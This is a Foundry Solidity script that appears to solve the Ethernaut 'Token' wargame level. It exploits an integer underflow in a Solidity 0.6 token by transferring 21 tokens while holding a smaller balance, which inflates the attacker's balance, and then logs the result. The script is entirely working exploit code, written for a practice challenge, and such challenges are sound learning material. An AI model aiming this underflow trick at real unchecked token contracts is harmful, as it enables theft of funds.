// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "src/05-Token.sol";


contract Exp is Script {

    Token public TokenInstance = Token(payable(/*获取的实例地址*/));
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
    address owner = vm.envAddress("MY_ADDRESS");

    function run() external {
        vm.startBroadcast(hacker);

        TokenInstance.transfer(address(0), 21);
        console.log("value: ", TokenInstance.balanceOf(owner));
        vm.stopBroadcast();
    }
}